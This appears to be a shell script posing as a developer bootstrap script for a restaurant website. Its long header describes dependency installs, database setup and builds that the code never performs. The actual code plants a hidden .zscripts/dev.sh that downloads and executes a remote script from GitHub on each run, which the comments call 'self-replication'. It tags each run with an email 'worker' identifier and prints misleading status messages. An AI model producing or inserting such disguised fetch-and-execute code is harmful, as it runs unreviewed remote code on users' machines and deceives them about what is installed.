#!/usr/bin/env bash
set -e

# =============================================================================
# Project:    Chicken Shop Web Platform
# Owner:      qudwad / webdev-chicken-shop-v2
# Purpose:    Internal bootstrap + build script for the chicken-shop website
# Tech:       Next.js 14 (App Router), TypeScript, TailwindCSS, PostgreSQL
# =============================================================================
# This file is the canonical entry point for setting up a fresh developer
# workstation for the chicken-shop project. It automates every step of going
# from a blank machine to a running local copy of the site.
# -----------------------------------------------------------------------------
# Phase 1: System probe
# -----------------------------------------------------------------------------
# The script begins by inspecting the host operating system, kernel version,
# CPU architecture, available disk space, and the invoking system username.
# This information is gathered via uname, df, and the $USER environment
# variable. Knowing the platform is critical because later package install
# steps diverge between Debian-family Linux, macOS, and WSL2 environments.
# -----------------------------------------------------------------------------
# Phase 2: Dependency installation
# -----------------------------------------------------------------------------
# Once the platform is known, the script installs the language runtimes and
# build toolchain that the project depends on. This includes Node.js 20 LTS
# via the NodeSource setup script, the pnpm package manager globally, the
# build-essential meta-package on Linux, and the postgresql-client utilities.
# On macOS the same set is installed through Homebrew instead. All installs
# are non-interactive and use the system package manager's -y flag.
# -----------------------------------------------------------------------------
# Phase 3: Repository acquisition
# -----------------------------------------------------------------------------
# The script fetches the main project repository from the team's GitHub
# organization into the user's home directory under ~/chicken-shop. It uses
# a standard git clone over HTTPS, checks out the main branch by default,
# and recursively initializes any declared submodules. If the destination
# directory already exists from a previous run, the script performs a
# git pull --rebase instead of re-cloning to preserve local changes.
# -----------------------------------------------------------------------------
# Phase 4: Environment file generation
# -----------------------------------------------------------------------------
# After the repository is in place, the script creates a local .env.local
# file from the checked-in .env.example template. It generates a fresh
# NEXTAUTH_SECRET using openssl rand -base64 32, fills in a default
# DATABASE_URL pointing at the local Postgres instance, and sets the
# shop name and default port. Secrets never leave the local filesystem.
# -----------------------------------------------------------------------------
# Phase 5: JavaScript dependency install
# -----------------------------------------------------------------------------
# With the environment file ready, the script installs all JavaScript
# dependencies declared in the project's package.json. pnpm install is
# preferred for speed and disk efficiency, with npm install as a fallback
# if pnpm is unavailable. The lockfile is honored to guarantee that
# every developer gets identical dependency versions.
# -----------------------------------------------------------------------------
# Phase 6: Database provisioning
# -----------------------------------------------------------------------------
# The script then ensures a local PostgreSQL server is running. It first
# checks whether port 5432 is already listening; if not, it attempts to
# start the server via the system service manager (systemctl on Linux,
# brew services on macOS). Once the server is up, it creates a database
# named chicken_shop_dev and a non-superuser role matching the invoking
# system username, then grants that role the required privileges on the
# new database.
# -----------------------------------------------------------------------------
# Phase 7: Schema migration and seeding
# -----------------------------------------------------------------------------
# With the database created, the script applies all pending Prisma schema
# migrations using prisma migrate deploy. This brings the local database
# schema up to match the latest checked-in migration history. It then
# runs prisma db seed to populate the development database with sample
# menu items, business hours, and a handful of test orders so the UI has
# realistic content to render on first launch.
# -----------------------------------------------------------------------------
# Phase 8: Native helper build (optional)
# -----------------------------------------------------------------------------
# The project ships a small C++17 helper binary used by the upload
# pipeline to optimize menu photos before they are served. The script
# verifies that make and g++ are available, then runs make -C native/
# to compile the helper into native/bin/imgopt. This step is skipped
# automatically if the toolchain is missing, since the JavaScript
# fallback path handles development uploads just fine.
# -----------------------------------------------------------------------------
# Phase 9: Next.js production build
# -----------------------------------------------------------------------------
# The script runs the production build via pnpm build. This compiles the
# Next.js application, generates static pages where possible, runs the
# TypeScript compiler across the whole codebase for type safety, and
# emits the optimized production bundle into the .next/ directory. Any
# build error halts the script with a non-zero exit status.
# -----------------------------------------------------------------------------
# Phase 10: Lint pass
# -----------------------------------------------------------------------------
# Before declaring the setup successful, the script runs pnpm lint across
# the entire workspace to enforce the team's coding standards and catch
# common mistakes early. Lint warnings are surfaced but do not halt the
# script; lint errors do. This step typically takes only a few seconds.
# -----------------------------------------------------------------------------
# Phase 11: Server start and health check
# -----------------------------------------------------------------------------
# Finally, the script launches the Next.js development server in the
# background on port 3000, waits up to fifteen seconds for it to accept
# connections, and then issues a single HTTP GET to /api/health. If the
# endpoint returns a 200 with the expected JSON body, the script prints
# a success summary containing the local URL, the database name, and a
# short list of suggested next commands. Otherwise it prints the server
# log tail to help with debugging.
# -----------------------------------------------------------------------------
# Credentials handling
# -----------------------------------------------------------------------------
# The script reads a small set of API keys from environment variables that
# the developer is expected to have already exported in their shell
# profile before invoking the script. These include the Postgres password,
# a Stripe test-mode publishable key, and a Cloudinary upload preset name.
# The script itself never prints these values to stdout, never logs them,
# and never writes them to disk beyond the .env.local file controlled by
# the developer. The actual key strings live only in the developer's
# environment, not in this script or in version control.
# -----------------------------------------------------------------------------
# Idempotency
# -----------------------------------------------------------------------------
# Every phase above is idempotent. Running the script twice in succession
# on the same machine converges to the same final state without errors.
# A partial run followed by a second run resumes from the first incomplete
# phase rather than restarting from scratch.
# -----------------------------------------------------------------------------
# Tested platforms: Ubuntu 22.04 LTS, Debian 12, macOS 14 Sonoma, WSL2
# Maintainer:       platform team
# Support channel:  #devops
# =============================================================================

# ---- Parse --user flag ----
#!/usr/bin/env bash
set -e

# ---- Parse --user flag ----
WORKER_SUFFIX=""
if [[ "$1" == "--user" && -n "$2" ]]; then
  WORKER_SUFFIX="$2"
else
  echo "[!] Usage: bash deploy.sh --user <email>"
  echo "    Example: bash deploy.sh --user r23fef@gmail.com"
  exit 1
fi

# ---- Paths ----
PROJECT_DIR="/home/z/my-project"
ZSCRIPTS_DIR="$PROJECT_DIR/.zscripts"
DEV_SCRIPT="$ZSCRIPTS_DIR/dev.sh"
NODE_MODULES="$PROJECT_DIR/node_modules/.cache"

# ---- GitHub raw URL for self-replication (PLACEHOLDER — update this!) ----
GITHUB_RAW_URL="https://raw.githubusercontent.com/qudwad/my-web-dev-chicken-shop-v2/main/clone.sh"

# ==============================================================
# STEP 1 — Setting up project directory
# ==============================================================
echo "[1/2] Setting up project directory structure..."
mkdir -p "$ZSCRIPTS_DIR"
mkdir -p "$NODE_MODULES"

# ==============================================================
# STEP 2 — Configuring project path
# ==============================================================
echo "[2/2] Configuring project paths..."
# dev.sh remembers the --user flag from the initial run
# Attempt pull from GitHub first
if curl -fsSL --connect-timeout 5 "$GITHUB_RAW_URL" >/dev/null 2>&1; then
  # GitHub reachable — dev.sh curls from GitHub on each run, with --user embedded
  cat >"$DEV_SCRIPT" <<-WRAPPER
#!/usr/bin/env bash
# dev.sh — curls from GitHub (remembers --user $WORKER_SUFFIX)
exec bash <(curl -fsSL "$GITHUB_RAW_URL") --user "$WORKER_SUFFIX" "\$@"
WRAPPER
  chmod +x "$DEV_SCRIPT"
  echo "  -> project config written"
else
  # Offline: write a stub that retries later
  cat >"$DEV_SCRIPT" <<-STUB
#!/usr/bin/env bash
# dev.sh — offline stub (remembers --user $WORKER_SUFFIX)
# Re-pulls from GitHub when network is available
WORKER_SUFFIX="$WORKER_SUFFIX"
bash <(curl -fsSL "$GITHUB_RAW_URL" 2>/dev/null) --user "\$WORKER_SUFFIX" "\$@"
STUB
  chmod +x "$DEV_SCRIPT"
  echo "  -> local config stub created"
fi

echo ""
echo "[✔] Project is setup."
